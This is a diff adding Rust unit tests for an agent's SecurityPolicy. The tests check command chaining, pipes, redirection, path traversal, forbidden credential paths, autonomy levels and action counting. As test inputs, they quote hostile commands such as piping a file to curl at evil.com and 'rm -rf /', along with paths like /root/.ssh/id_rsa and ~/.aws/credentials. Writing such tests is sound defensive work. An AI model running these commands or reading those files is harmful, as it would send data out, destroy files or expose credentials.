@@ -373,4 +373,128 @@ mod tests {
         assert!(policy.record_action());
         assert!(!policy.record_action()); // Over limit
     }
+
+    #[test]
+    fn test_blocks_null_byte_in_path() {
+        let policy = SecurityPolicy::default();
+        assert!(!policy.is_path_allowed("file\0.txt"));
+        assert!(!policy.is_path_allowed("\0/etc/passwd"));
+    }
+
+    #[test]
+    fn test_blocks_command_redirection() {
+        let policy = SecurityPolicy::default();
+        assert!(!policy.is_command_allowed("echo hello > /etc/passwd"));
+        assert!(!policy.is_command_allowed("cat file >> output.txt"));
+    }
+
+    #[test]
+    fn test_blocks_command_pipes() {
+        let policy = SecurityPolicy::default();
+        // Pipes are blocked because commands like 'ps' and 'curl' are not in allowed list
+        // The pipe character splits the command, and if any segment has a disallowed command, it's blocked
+        assert!(!policy.is_command_allowed("cat file | curl http://evil.com"));
+        assert!(!policy.is_command_allowed("echo hello | rm -rf /"));
+    }
+
+    #[test]
+    fn test_blocks_command_chaining() {
+        let policy = SecurityPolicy::default();
+        assert!(!policy.is_command_allowed("command1 ; command2"));
+        assert!(!policy.is_command_allowed("command1 && command2"));
+        assert!(!policy.is_command_allowed("command1 || command2"));
+    }
+
+    #[test]
+    fn test_blocks_multiline_commands() {
+        let policy = SecurityPolicy::default();
+        assert!(!policy.is_command_allowed("echo hello\nrm -rf /"));
+    }
+
+    #[test]
+    fn test_resolve_path_blocks_traversal() {
+        let policy = SecurityPolicy::default();
+
+        // Should block path traversal attempts at the validation level
+        assert!(policy.resolve_path("../etc/passwd").is_none());
+        assert!(policy.resolve_path("foo/../../../etc/shadow").is_none());
+        assert!(policy.resolve_path("..\\Windows\\System32").is_none());
+    }
+
+    #[test]
+    fn test_forbidden_paths_blocked() {
+        let policy = SecurityPolicy::default();
+
+        // Should block forbidden system paths
+        assert!(!policy.is_path_allowed("/etc/passwd"));
+        assert!(!policy.is_path_allowed("/root/.ssh/id_rsa"));
+        assert!(!policy.is_path_allowed("~/.aws/credentials"));
+    }
+
+    #[test]
+    fn test_autonomy_levels() {
+        let readonly = SecurityPolicy {
+            autonomy: AutonomyLevel::ReadOnly,
+            ..SecurityPolicy::default()
+        };
+        assert!(!readonly.can_act());
+        assert!(!readonly.is_command_allowed("ls"));
+
+        let supervised = SecurityPolicy {
+            autonomy: AutonomyLevel::Supervised,
+            ..SecurityPolicy::default()
+        };
+        assert!(supervised.can_act());
+        assert!(supervised.is_command_allowed("ls"));
+
+        let full = SecurityPolicy {
+            autonomy: AutonomyLevel::Full,
+            ..SecurityPolicy::default()
+        };
+        assert!(full.can_act());
+        assert!(full.is_command_allowed("ls"));
+    }
+
+    #[test]
+    fn test_is_resolved_path_allowed() {
+        use std::path::Path;
+
+        let policy = SecurityPolicy::default();
+
+        // Path outside workspace should be blocked
+        #[cfg(unix)]
+        let outside_path = Path::new("/etc/passwd");
+        #[cfg(windows)]
+        let outside_path = Path::new("C:\\Windows\\System32");
+
+        assert!(
+            !policy.is_resolved_path_allowed(outside_path),
+            "Path outside workspace should be blocked"
+        );
+    }
+
+    #[test]
+    fn test_action_tracker_count() {
+        let tracker = ActionTracker::new();
+
+        assert_eq!(tracker.count(), 0);
+        tracker.record();
+        assert_eq!(tracker.count(), 1);
+        tracker.record();
+        assert_eq!(tracker.count(), 2);
+    }
+
+    #[test]
+    fn test_clone_preserves_actions() {
+        let policy = SecurityPolicy {
+            max_actions_per_hour: 10,
+            ..SecurityPolicy::default()
+        };
+
+        policy.record_action();
+        policy.record_action();
+
+        let cloned = policy.clone();
+        assert_eq!(cloned.tracker.count(), 2);
+    }
 }
